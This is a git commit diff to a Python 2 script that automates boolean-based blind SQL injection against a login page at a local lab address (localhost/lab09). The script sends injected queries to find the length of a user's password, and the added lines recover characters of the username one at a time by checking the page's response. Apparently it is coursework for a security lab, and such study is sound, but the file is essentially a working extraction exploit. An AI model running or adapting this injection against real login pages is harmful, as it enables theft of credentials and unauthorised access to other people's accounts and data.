0b86554a9a336dcac10adf39944e5682549138be
Ny4nc4t <>
2019-05-16 14:34:32 +0200

    qw

--- script.py
+++ script.py
@@ -1,5 +1,6 @@
 import subprocess
 import urllib
+import string
 
 
 # request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
@@ -16,12 +17,19 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 
 ################################# Loop to get field's size
 
-for x in xrange(0,25):
+for x in xrange(0,40):
 	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(password)%20=%20" + str(x) + "--%20"
 	f = urllib.urlopen(request)
 	response = f.read()
 	if (response.find('cat.JPG')!=-1): 
 		print "found size : %s" %x
+
+for x in xrange(0,128):
+	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(username,1,1)%20=%20%27" + chr(x) + "%27%20--%20" 
+	f = urllib.urlopen(request)
+	response = f.read()
+	if (response.find('cat.JPG')!=-1): 
+		print "found letter %s" %chr(x)
 
 f = urllib.urlopen(request)
 print "1" + f.geturl()
